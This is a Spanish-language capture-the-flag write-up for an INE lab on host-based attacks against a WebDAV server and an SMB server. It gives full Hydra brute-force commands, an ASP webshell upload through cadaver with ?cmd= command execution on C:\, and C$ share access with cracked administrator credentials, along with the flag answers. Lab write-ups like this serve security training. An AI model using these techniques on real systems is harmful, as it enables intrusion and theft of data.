# 🧩 CTF de Ataques Basados en Host – 1 (WebDAV + SMB)

## 📋 Descripción del laboratorio

**Máquinas objetivo:**  
- `target1.ine.local` (servidor IIS con WebDAV)  
- `target2.ine.local` (servidor SMB)  

**Formato de banderas:** hash MD5. Se deben capturar cuatro banderas.  
Se proporcionan listas de palabras:  
- `/usr/share/metasploit-framework/data/wordlists/common_users.txt`  
- `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`  
- `/usr/share/webshells/asp/webshell.asp` (útil para la explotación web)

**Objetivo:** aplicar ataques basados en el sistema/host a cada máquina para recuperar las banderas ocultas.

---

## 🛠️ Herramientas empleadas

| Herramienta      | Propósito |
|------------------|-----------|
| **Nmap**         | Escaneo de puertos y detección de servicios |
| **Hydra**        | Fuerza bruta contra HTTP y SMB |
| **Dirb**         | Enumeración de directorios web |
| **Davtest**      | Verificar capacidades WebDAV (subida y ejecución de archivos) |
| **Cadaver**      | Cliente WebDAV interactivo |
| **Metasploit**   | Apoyo en enumeración SMB (`smb_enumshares`, `smb_login`) |
| **Smbclient**    | Cliente SMB para listar/descargar archivos |

---

## 🔍 Fase 1: Enumeración inicial de servicios

```bash
nmap -sC -sV target1.ine.local
nmap -sC -sV target2.ine.local
```

**Resultados esperados:**

| Máquina           | Puerto | Servicio       | Versión / Nota |
|-------------------|--------|----------------|----------------|
| target1.ine.local | 80     | HTTP (IIS)     | Apache o IIS, con WebDAV expuesto |
| target2.ine.local | 139,445| SMB            | Samba / Windows |

---

## 🚩 Flag 1 – Fuerza bruta al usuario `bob` y acceso al WebDAV

### 📡 Pista  
*"El usuario 'bob' puede no haber elegido una contraseña segura. Pruebe contraseñas comunes para obtener acceso al servidor donde se encuentra la bandera."*

### 🔐 Ataque con Hydra al servicio HTTP (autenticación básica)

```bash
hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get
```

| Parámetro | Significado |
|-----------|-------------|
| `-l bob`  | Usuario fijo (bob) |
| `-P <ruta>` | Diccionario de contraseñas |
| `http-get`  | Método HTTP a probar |

**Salida:**
```
[80][http-get] host: target1.ine.local   login: bob   password: password_123321
```
🔑 **Credenciales obtenidas:** `bob` / `password_123321`

### 🌐 Acceso al directorio WebDAV

Con `dirb` (opcional) o directamente sabiendo que existe el directorio `/webdav`, se entra con las credenciales vía Cadaver:

```bash
cadaver http://target1.ine.local/webdav/
```

Se ingresan las credenciales. Una vez dentro, se listan los archivos:

```
dav:/webdav/> ls
flag1.txt
```

### 📥 Descarga y lectura de la bandera

```bash
dav:/webdav/> get flag1.txt
```

O desde el navegador: `http://target1.ine.local/webdav/flag1.txt`.

**Flag 1:** `cfb3b61e341f49a7b2145f0a2fe88ed6`

---

## 🚩 Flag 2 – Carga de webshell ASP y acceso a C:\

### 📡 Pista  
*"Los archivos valiosos suelen estar en la unidad C:. Exploralo a fondo."*

### 🧪 Confirmar capacidad de ejecución con Davtest

Antes de subir una webshell, verificamos qué extensiones son ejecutables:

```bash
davtest -auth bob:password_123321 -url http://target1.ine.local/webdav/
```

**Salida:**
```
PUT for asp - SUCCESS
asp - EXECUTABLE
txt - EXECUTABLE
html - EXECUTABLE
```
✅ **Los archivos .asp se pueden subir y ejecutar.**

### 📤 Subida de webshell ASP con Cadaver

Kali incluye una webshell en `/usr/share/webshells/asp/webshell.asp`. La subimos:

```bash
cadaver http://target1.ine.local/webdav/
> put /usr/share/webshells/asp/webshell.asp
```

Confirmamos que existe:
```
dav:/webdav/> ls
flag1.txt
webshell.asp
```

### 🧠 Ejecución de comandos vía navegador

Abrir el navegador y visitar la URL de la webshell:

```
http://target1.ine.local/webdav/webshell.asp
```

Se muestra un campo de texto donde se pueden ingresar comandos. Alternativamente, pasar el comando por el parámetro `?cmd=`:

```
http://target1.ine.local/webdav/webshell.asp?cmd=dir+C%3A%5C
```

Esto lista el disco `C:\`. Allí se observa el archivo `flag2.txt`.

### 📄 Lectura de la bandera

```
http://target1.ine.local/webdav/webshell.asp?cmd=type+C%3A%5Cflag2.txt
```

**Flag 2:** `779c90867fbb412f856b55d7661aa4b1`

---

## 🚩 Flag 3 – Enumeración y fuerza bruta SMB

### 📡 Pista  
*"Al intentar adivinar las credenciales de usuario de SMB, puede descubrir información importante que podría llevarlo a la siguiente bandera."*

### 🔍 Enumeración inicial SMB sin credenciales

```bash
smbclient -L target2.ine.local -N
```

Normalmente la sesión nula no muestra nada o da error. Se procede a un ataque de fuerza bruta.

### 🔐 Fuerza bruta SMB con Hydra

Usamos el diccionario de usuarios y contraseñas suministrado:

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
      smb://target2.ine.local
```

**Salida:**
```
[445][smb] host: target2.ine.local   login: administrator   password: pineapple
...
```
🔑 Se encuentra el usuario **administrator** con la contraseña **pineapple** (el diccionario puede arrojar múltiples combinaciones; esta es la relevante).

### 📂 Enumeración de recursos compartidos con smbclient

Con las credenciales, listamos los recursos disponibles:

```bash
smbclient -L \\target2.ine.local -U administrator
```

Tras ingresar la contraseña, aparecen los shares:
```
ADMIN$
C$
IPC$
...
```

### 📥 Acceso al recurso C$ (disco raíz)

```bash
smbclient \\\\target2.ine.local\\C$ -U administrator
```

Se ingresa la contraseña y se obtiene una sesión SMB. Dentro de ella, exploramos:

```
smb: \> ls
...
flag3.txt
...
smb: \> more flag3.txt
```

**Flag 3:** *(hash MD5 mostrado en consola)*

---

## 🚩 Flag 4 – Directorio Desktop del Administrador

### 📡 Pista  
*"El directorio de escritorio podría tener lo que estás buscando. Enumerar su contenido."*

Desde la misma sesión de `smbclient` en el disco `C$`, navegamos al escritorio del administrador:

```bash
smb: \> cd Users\Administrator\Desktop
smb: \Users\Administrator\Desktop\> ls
  flag4.txt
smb: \Users\Administrator\Desktop\> more flag4.txt
```

**Flag 4:** `126e5dcaad464874943f6ca98953a80f`

---

## 🧠 Resumen del flujo de ataque

| Máquina   | Vector                         | Técnica / Herramienta               | Flags capturadas |
|-----------|--------------------------------|--------------------------------------|------------------|
| target1   | WebDAV con autenticación débil | Hydra, Cadaver, Davtest, webshell   | Flag1, Flag2     |
| target2   | SMB con contraseña débil       | Hydra, smbclient                    | Flag3, Flag4     |

### 💡 Lecciones aprendidas

- La enumeración de servicios y un buen diccionario de contraseñas son la base para acceder a sistemas mal configurados.
- WebDAV, aunque sea una tecnología legítima, puede convertirse en un vector de entrada si se permite la subida de archivos ejecutables.
- Las sesiones nulas SMB o los recursos compartidos accesibles con credenciales débiles exponen todo el sistema de archivos.
- Combinar herramientas manuales (Cadaver, smbclient) con ataques de diccionario (Hydra) proporciona un control muy fino de la explotación.
